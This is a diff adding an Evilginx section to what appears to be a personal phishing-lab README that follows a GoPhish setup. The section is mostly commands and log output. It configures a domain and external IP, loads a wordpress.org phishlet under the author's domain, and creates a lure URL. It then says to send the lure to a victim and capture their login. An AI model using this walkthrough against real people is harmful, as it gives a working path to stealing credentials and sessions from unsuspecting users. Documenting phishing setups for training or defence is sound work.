@@ -148,3 +148,80 @@ Below is the Sending Profile settings inside of `GoPhish`.
 <img width="711" height="542" alt="Screenshot 2025-07-23 215308" src="https://github.com/user-attachments/assets/06f3cf8a-8d87-4ccc-ae72-d6e47c678d9e" />
 
 <img width="641" height="620" alt="Screenshot 2025-07-23 215342" src="https://github.com/user-attachments/assets/a1dfed38-832f-46a8-9c8b-f2b1cc7c6fd5" />
+
+## Evilginx
+
+```
+./evilginx
+```
+
+```
+config domain <your domain>
+```
+
+<img width="768" height="404" alt="Screenshot 2025-07-23 223223" src="https://github.com/user-attachments/assets/4b8952af-b13e-40d8-9f24-53e3353572d7" />
+
+
+Use your Droplets ipv4
+```
+config ipv4 external <ip address>
+```
+
+```
+config ipv4 external 146.190.223.207
+```
+In my Namecheap DNS, I've made sure to add 3 A records for `login, make, and profiles`
+
+<img width="1142" height="333" alt="Screenshot 2025-07-24 213348" src="https://github.com/user-attachments/assets/c31d7edd-1768-451b-b619-67602a3d4482" />
+
+Add the wordpress phishlet into the evilginx folder
+
+Then we can relaunch evilginx and hide the default example
+
+```
+phishlets hide example
+```
+
+```
+phishlets hostname wordpress.org khangtran.shop
+```
+
+```
+phishlets enable wordpress.org
+```
+Below, we have random bots getting blacklisted because they try to authenticate to random wordpress instances, but are blacklisted because they do not have the correct `lure`
+
+<img width="660" height="469" alt="Screenshot 2025-07-24 013516" src="https://github.com/user-attachments/assets/c62b166e-4bde-4c5c-910e-81c243f38e81" />
+
+
+```
+lures create wordpress.org
+```
+
+```
+lures get-url 0
+```
+
+
+Now all the blacklisting has stopped and we see this
+
+```
+: lures get-url 0
+
+https://khangtran.shop/vVRBAqQA
+
+: 2025/07/24 05:37:34 [037] WARN: Cannot handshake client login.wordpress.org EOF
+2025/07/24 05:37:34 [036] WARN: Cannot handshake client login.wordpress.org EOF
+```
+
+Now we can send this lure to a victim
+```
+https://khangtran.shop/vVRBAqQA
+```
+
+have them try to  sign-in 
+
+and then successfully capture their login
+
+<img width="658" height="79" alt="Screenshot 2025-07-24 013931" src="https://github.com/user-attachments/assets/b6382756-2ff8-4fe0-8d60-c8c04ae923b5" />
+
